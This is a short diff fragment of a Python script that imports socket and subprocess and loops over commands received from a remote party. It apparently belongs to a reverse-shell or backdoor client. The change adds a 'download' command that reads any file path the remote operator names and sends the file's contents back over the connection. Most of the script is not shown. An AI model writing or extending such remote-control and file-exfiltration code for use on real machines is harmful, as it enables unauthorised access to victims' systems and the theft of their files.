@@ -1,3 +1,4 @@
+
 import socket
 import subprocess
 
@@ -30,6 +31,13 @@ while True:
 			send_data(b"File not found")
 		else:
 			send_data(b"Changed directory")
+		continue
+
+	elif cmd[:8] == "download":
+		with open(f'{cmd[9:]}', 'rb') as data:
+			data_read = data.read()
+			data.close()
+		send_data(data_read)
 		continue
 
 	try:
